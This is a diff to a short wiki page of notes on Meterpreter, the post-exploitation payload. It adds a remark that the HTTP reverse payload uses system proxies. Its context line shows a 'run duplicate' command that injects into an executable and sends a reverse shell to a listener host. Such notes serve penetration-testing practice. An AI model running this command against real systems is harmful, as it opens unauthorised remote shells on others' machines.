@@ -1,6 +1,10 @@
 <!-- TITLE: Meterpreter -->
 <!-- SUBTITLE: A quick summary of Meterpreter -->
 
+
+# Things to note
+http_reverse_tcp - honors the system http proxies (which might be set to burp for example).
+
 # Sending Shells to other people
 
 run duplicate -D -r -e executable_to_inject -p 4444 -r listenhost
